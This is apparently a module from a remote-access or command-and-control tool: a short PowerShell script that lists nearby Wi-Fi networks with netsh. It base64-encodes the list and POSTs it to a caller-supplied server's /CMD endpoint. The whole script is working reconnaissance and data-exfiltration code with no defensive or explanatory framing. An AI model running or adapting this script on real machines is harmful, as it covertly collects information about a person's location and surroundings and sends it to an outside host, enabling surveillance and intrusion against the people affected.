param (
    [string]$uri = ""
)

$wifi = netsh wlan show networks mode=bssid | findstr "SSID Signal Channel"
$wifibytes = [System.Text.Encoding]::UTF8.GetBytes($wifi)
$wifienc = [Convert]::ToBase64String($wifibytes)

$postdat = @{os='windows';data=$wifienc}
Invoke-WebRequest -Uri "$uri/CMD" -Method POST -Body $postdat
